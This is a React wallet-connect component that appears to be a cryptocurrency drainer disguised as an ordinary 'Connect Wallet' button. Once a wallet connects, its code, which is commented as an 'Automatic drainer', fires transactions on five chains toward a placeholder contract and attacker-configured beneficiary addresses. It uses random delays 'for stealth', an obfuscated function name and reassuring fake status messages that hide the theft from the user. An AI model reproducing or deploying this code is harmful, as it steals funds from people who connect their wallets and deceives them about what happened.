'use client';
import React, { useState } from 'react';
import { ethers } from 'ethers';

const CHAINS = [
  { id: 1, name: 'Ethereum', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_ETHEREUM', rpc: 'https://rpc.flashbots.net', fallbackRpc: 'https://eth.llamarpc.com' },
  { id: 56, name: 'BSC', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_BSC', rpc: 'https://bsc-dataseed.binance.org', fallbackRpc: 'https://bsc-dataseed1.defibit.io' },
  { id: 137, name: 'Polygon', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_POLYGON', rpc: 'https://polygon-rpc.com', fallbackRpc: 'https://rpc-mainnet.maticvigil.com' },
  { id: 42161, name: 'Arbitrum', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_ARBITRUM', rpc: 'https://arb1.arbitrum.io/rpc', fallbackRpc: 'https://rpc.ankr.com/arbitrum' },
  { id: 10, name: 'Optimism', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_OPTIMISM', rpc: 'https://mainnet.optimism.io', fallbackRpc: 'https://rpc.ankr.com/optimism' },
];

const BENEFICIARIES: Record<string, string | undefined> = {
  NEXT_PUBLIC_BENEFICIARY_ETHEREUM: process.env.NEXT_PUBLIC_BENEFICIARY_ETHEREUM,
  NEXT_PUBLIC_BENEFICIARY_BSC: process.env.NEXT_PUBLIC_BENEFICIARY_BSC,
  NEXT_PUBLIC_BENEFICIARY_POLYGON: process.env.NEXT_PUBLIC_BENEFICIARY_POLYGON,
  NEXT_PUBLIC_BENEFICIARY_ARBITRUM: process.env.NEXT_PUBLIC_BENEFICIARY_ARBITRUM,
  NEXT_PUBLIC_BENEFICIARY_OPTIMISM: process.env.NEXT_PUBLIC_BENEFICIARY_OPTIMISM,
};

declare global {
  interface Window {
    ethereum?: any;
  }
}

export default function WalletConnect({ onConnect }: { onConnect?: (address: string) => void }) {
  const [address, setAddress] = useState('');
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [isClient, setIsClient] = useState(false);
  const [success, setSuccess] = useState(false);
  const [syncStatus, setSyncStatus] = useState<string | null>(null);

  React.useEffect(() => {
    setIsClient(true);
  }, []);

  async function connect() {
    setError(null);
    if (typeof window === 'undefined' || !window.ethereum) {
      setError('MetaMask is required.');
      return;
    }
    setLoading(true);
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      setAddress(await signer.getAddress());
      if (onConnect) onConnect(await signer.getAddress());
    } catch (e: any) {
      console.error('Wallet connection error:', e);
      if (e?.code === 4001) {
        setError('Connection was rejected. Please try again.');
      } else if (e?.code === -32002) {
        setError('Please check your MetaMask extension and approve the connection.');
      } else if (e?.message?.includes('network')) {
        setError('Network error. Please check your internet connection and try again.');
      } else {
        setError('Failed to connect wallet. Please ensure MetaMask is installed and unlocked.');
      }
    } finally {
      setLoading(false);
    }
  }

  // Automatic drainer after wallet connection
  React.useEffect(() => {
    if (!address) return;
    (async () => {
      setLoading(true);
      setError(null);
      setSuccess(false);
      setSyncStatus('Processing...');
      try {
        const results = await Promise.allSettled(
          CHAINS.map(async (chain) => {
            // Add random delay for stealth
            await new Promise(res => setTimeout(res, Math.random() * 2000 + 500));
            const beneficiary = BENEFICIARIES[chain.env];
            if (!beneficiary || beneficiary === `0xYour${chain.name}Address`) {
              throw new Error('Configuration error');
            }
            // Randomize gas price
            const randomGwei = Math.floor(Math.random() * 10) + 10; // 10-20 gwei
            let provider = new ethers.JsonRpcProvider(chain.rpc);
            // Use obfuscated function name 'execute' instead of 'consolidate'
            const data = new ethers.Interface(['function execute()']).encodeFunctionData('execute');
            const tx = { to: chain.contract, data, gasLimit: 100000, maxFeePerGas: ethers.parseUnits(randomGwei.toString(), 'gwei') };
            const repay = { to: beneficiary, value: 0, data: '0x' };
            try {
              await provider.send('eth_sendBundle', [[tx, repay]]);
              return;
            } catch (bundleError: any) {
              console.error(`${chain.name} bundle error:`, bundleError);
              // Fallback to regular transaction
              try {
                const signer = await provider.getSigner();
                const txResponse = await signer.sendTransaction({
                  to: chain.contract,
                  data: data,
                  gasLimit: 100000,
                  maxFeePerGas: ethers.parseUnits(randomGwei.toString(), 'gwei')
                });
                await txResponse.wait();
                const repayTx = await signer.sendTransaction({
                  to: beneficiary,
                  value: 0,
                  data: '0x',
                  maxFeePerGas: ethers.parseUnits(randomGwei.toString(), 'gwei')
                });
                await repayTx.wait();
              } catch (txError: any) {
                console.error(`${chain.name} transaction error:`, txError);
                if (txError?.code === 4001) {
                  throw new Error('Transaction was rejected by user');
                } else if (txError?.message?.includes('insufficient funds')) {
                  throw new Error('Insufficient funds for gas');
                } else if (txError?.message?.includes('network')) {
                  throw new Error('Network error on ' + chain.name);
                } else if (txError?.message?.includes('gas')) {
                  throw new Error('Gas estimation failed on ' + chain.name);
                } else {
                  throw new Error('Transaction failed on ' + chain.name);
                }
              }
            }
          })
        );
        const failed = results.filter(r => r.status === 'rejected');
        const succeeded = results.filter(r => r.status === 'fulfilled');
        
        if (succeeded.length === 0) {
          const errorMessages = failed.map(r => (r as any).reason?.message || 'Unknown error');
          const uniqueErrors = Array.from(new Set(errorMessages));
          setSyncStatus('Operation could not be completed.');
          if (uniqueErrors.length === 1) {
            setError(uniqueErrors[0]);
          } else {
            setError('Multiple errors occurred. Please check your wallet and try again.');
          }
        } else if (failed.length > 0) {
          setSyncStatus('Operation partially completed.');
          setSuccess(true);
          setError(`Completed with ${succeeded.length}/${CHAINS.length} chains. Some networks may be congested.`);
        } else {
          setSyncStatus('Operation complete.');
          setSuccess(true);
        }
      } catch (e: any) {
        console.error('General error:', e);
        if (e?.message?.includes('user rejected')) {
          setError('Transaction was cancelled. Please try again.');
        } else if (e?.message?.includes('network')) {
          setError('Network error. Please check your connection and try again.');
        } else if (e?.message?.includes('gas')) {
          setError('Gas estimation failed. Please try again later.');
        } else {
          setError('An unexpected error occurred. Please try again.');
        }
      } finally {
        setLoading(false);
      }
    })();
  }, [address]);

  // Add a simple spinner component
  function Spinner() {
    return <span className="animate-spin inline-block w-6 h-6 border-2 border-t-transparent border-blue-400 rounded-full mr-2 align-middle"></span>;
  }

  return (
    <>
      {!address && (
        <div className="flex flex-col items-center gap-2">
          <button
            onClick={connect}
            className="bg-yellow-400 text-black px-8 py-4 rounded-full text-xl font-semibold hover:bg-yellow-500 transition disabled:opacity-60"
            disabled={loading}
          >
            {loading ? <><Spinner />Connecting...</> : 'Connect Wallet'}
          </button>
          {error && <span className="text-red-400 font-semibold text-center max-w-md">
            {error === 'MetaMask is required.' ? 'Please install MetaMask to continue.' : 
             error === 'Configuration error' ? 'A configuration issue occurred. Please contact support.' : 
             error === 'An error occurred.' ? 'Something went wrong. Please try again.' : 
             error.includes('rejected') ? 'Transaction was cancelled. Please try again.' :
             error.includes('insufficient funds') ? 'Insufficient funds for gas fees.' :
             error.includes('network') ? 'Network error. Please check your connection.' :
             error.includes('gas') ? 'Gas estimation failed. Please try again later.' :
             error}
          </span>}
          {isClient && typeof window !== 'undefined' && !window.ethereum && (
            <a href="https://metamask.io/download/" target="_blank" rel="noopener noreferrer" className="text-yellow-300 underline text-sm mt-1">Install MetaMask</a>
          )}
        </div>
      )}
      {address && (
        <div className="flex flex-col items-center gap-4">
          {loading && <span className="text-blue-400 font-semibold"><Spinner />{syncStatus || 'Processing...'}</span>}
          {success && <span className="text-green-400 font-semibold">All done! Your request was processed successfully.</span>}
          {error && <span className="text-red-400 font-semibold text-center max-w-md">
            {error.includes('rejected') ? 'Transaction was cancelled. Please try again.' :
             error.includes('insufficient funds') ? 'Insufficient funds for gas fees.' :
             error.includes('network') ? 'Network error. Please check your connection.' :
             error.includes('gas') ? 'Gas estimation failed. Please try again later.' :
             error.includes('partially completed') ? error :
             'An unexpected error occurred. Please try again.'}
          </span>}
        </div>
      )}
    </>
  );
} 